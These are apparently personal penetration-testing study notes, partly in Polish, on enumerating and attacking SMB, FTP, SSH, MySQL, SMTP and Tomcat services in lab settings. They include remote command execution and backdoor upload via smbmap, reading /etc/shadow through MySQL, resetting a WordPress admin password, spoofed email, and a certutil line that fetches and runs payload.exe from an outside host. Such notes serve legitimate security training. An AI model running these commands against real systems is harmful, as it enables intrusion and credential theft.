# SMB (T:445)

```PowerShell
# mapowanie dysku smb z Power Shell
# mapuje dysk sieciowy i widać go w eksploratorze
net use Z:\\10.4.17.133\c$ <hasło> /user:administrator
# usuń wszystkie połączenia
net use * /delete
```

"The IPC$ share is also known as a null session connection. By using this session, Windows
lets anonymous users perform certain activities, such as enumerating the names of domain
accounts and network shares.”

## $ enum4linux (kombajn)

Tool for enumerating information from Windows and Samba systems.  
It is written in PERL and is basically a wrapper around the Samba tools smbclient, rpclient, net and nmblookup.

```bash
# wyświetl wszystkie info
$ enum4linux <IP>
```

|      |                                                                   |
| ---- | ----------------------------------------------------------------- |
| `-v` | **verbose**. Shows full commands being run (net, rpcclient, etc.) |
| `-a` | Do all simple enumeration (-U -S -G -P -r -o -n -i)               |
| `-o` | get OS info                                                       |
| `-S` | List all available shares on the samba server                     |
| `-u` | username (opcjonalnie logowanie)                                  |
| `-p` | password (opcjonalnie logowanie)                                  |

## $ nmap

```bash
nmap <IP> -p 445 --script "safe or smb-enum-*"
```

```bash
$ nmap 10.0.17.20 -p445 --script
```

[[nmap#smb]]

## $ smbmap

Samba Share Enumerator

```bash
$ smbmap -u guest -p "" -d . -H 10.4.26.58 # discover all shared folders and drives jako gość (domyślne konto)
$ smbmap -H 192.212.251.3 -u admin -p password1 # pokazuje zasoby i jakie ma uprawnienia do nich użytkownik
$ smbmap -u administrator -p smbserver_771 -d . -H 10.0.28.123 # jak wyżej ale jako odpowiedni użytkownik
$ smbmap -u administrator -p smbserver_771 -H 10.4.26.58 -x 'ipconfig' # execute command on the target machine
$ smbmap -u administrator -p smbserver_771 -H 10.4.26.58 -L # Listing all drives on the specified host
$ smbmap -u administrator -p smbserver_771 -H 10.4.26.58 -r 'C$' # List contents of the directory of C:\ drive
$ smbmap -u administrator -p smbserver_771 -H 10.4.26.58 --upload '/root/kali/backdor' 'C$\backdor' # Uploading a sample file
$ smbmap -u administrator -p smbserver_771 -H 10.4.26.58 -download 'C$\flag.txt' # Downloading a sample file
```

## $ smbclient (pozwala zalogować się zasobu)

```bash
$ smbclient -L 192.144.106.3 -N # List all available shares on the samba server
# zasób może byc niewidzialny ale nadal można sie do niego zalogować
$ smbclient //192.212.251.3/jane -U jane # Checking whether jane share exists
```

```bash
# Wejście do zasobu, listowanie zawartości i pobranie pliku z flagą
$ smbclient //192.144.106.3/public -N
  > ls
  > get flag.txt
  > exit
  ...
$ cat flag.txt
```

|      |                                                                                                                                                                                         |
| ---- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-N` | `-no-pass` If specified, this parameter suppresses the normal password prompt from the client to the user.<br>This is useful when accessing a service that does not require a password. |
| `-L` | `--list`` This option allows you to look at what services are available on a server.<br>You use it as smbclient -L host and a list should appear.                                       |
| `-U` | `--user=[DOMAIN\]USERNAME[%PASSWORD]` Sets the SMB username or username and password.                                                                                                   |

## $ msf

[[Metasploit#SMB]]

## $ nmblookup

```bash
# NetBIOS over TCP/IP client used to lookup NetBIOS names
$ nmblookup -A <IP>
```

## $ rpclient

```bash
$ rpcclient -U "" -N <IP> # null sesion
> srvinfo # Find the OS version of samba serve
> enumdomusers # List all users that exists on the samba serve
> enumdomgroups # Find domain groups that exists on the samba server
> lookupnames admin # Find SID of user “admin”
```

|      |           |
| ---- | --------- |
| `-U` | username  |
| `-N` | no passwd |

# FTP (T:20,21)

## $ nmap

https://nmap.org/nsedoc/scripts/ftp-brute

```bash
$ nmap 192.235.127.3 -p 21 --script
```

[[nmap#ftp]]

## $ ftp IP

anonymous login

```bash
$ ftp <IP>
> user: anonymous
> password: password
ftp> ls
ftp> get filename.txt
```

# SSH (T:22)

## $ nmap

```bash
$ nmap ... -script
```

[[nmap#ssh]]

## $ hydra

```bash
$ hydra
```

## $ msf
[[Metasploit#SSH]]
# HTTP web server (T:80)

## $ msf
[[Metasploit#HTTP]]
## $ whatweb

```bash
$ whatweb <IP>
```

## $ http

```bash
$ http <IP>
```

## $ browsh

```bash
$ browsh --startup-url http://10.0.29.163/Default.aspx
```

# HTTP file server (T:80)

# MySQL (T:3306)

## $ mysql

```bash
$ mysql -h <ip> -u <root>
# pokaz  bazy dancyh na serwerze
$ show databases;
wejdź do konkretnej bazy danych
$ use db_name;
# pokaż tabele w bazie danych
$ show tables;
# pokaż całą zawartośc tabeli authors
$ select * from authors;
# policz ilośc wierszy tabeli authors
$ select count(*) from authors;
# podejrzyj plik
$ select load_file("/etc/shadow");
```
```bash
# update hasła dla użytkownika admin w tabeli wp_users
UPDATE wp_users SET user_pass = MD5('password123') WHERE user_login = 'admin';
```

## $ msf
![[Metasploit#MYSQL]]

## $ nmap

```bash
nmap <target> --script=<script-name> # np.: --script=http-fileupload-exploiter
```

[[nmap#mysql]]

# MSSQL (T:1433)

## $ msf

![[Metasploit#MSSQL]]
## $ nmap
[[nmap#mssql]]

# SMTP (T:25/465/587)

Simple Mail Transfer Protocol

```bash
$ nmap -sV -script banner <target_IP>

$ nc <target_IP> 25
    VRFY admin@openmailbox.xyz # Does user “admin” exist on the server machine?
    VRFY commander@openmailbox.xyz # Does user “commander” exist on the server machine?

# What commands can be used to check the supported commands/capabilities?
$ telnet <target_IP> 25
    HELO attacker.xyz
    EHLO attacker.xyz

# How many of the common usernames present in the dictionary ../usernames.txt exist on the server.
$ smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t <target_IP>
```

## $ msf

![[Metasploit#SMTP]]

## send fake mail to user using telnet

Connect to SMTP service using telnet and send a fake mail to root user.

```bash
$ telnet <target_IP> 25
HELO attacker.xyz
mail from: admin@attacker.xyz
rcpt to:root@openmailbox.xyz
data
Subject: Hi Root
Hello,
This is a fake mail sent using telnet command.
From,
Admin
.
# There is a dot(.) in the last line which indicates the termination of data.
```

## sendmail

```bash
$ sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s 192.26.29.3 -u Fakemail -m "Hi root, a fake from admin" -o tls=no

```

# Apache Tomcat (T:8080)

The Apache Tomcat web server is primarily used to host dynamic websites or web applications developed in Java.

## $ msf
[[Metasploit#Apache Tomcat]]

```bash
# kopiuje na windows plik z adresu ... i zapisuje do pliku payload.exe
certutil -urlcache -f http://10.10.18.6:8000/payload.exe payload.exe
dir
.\payload.exe
```
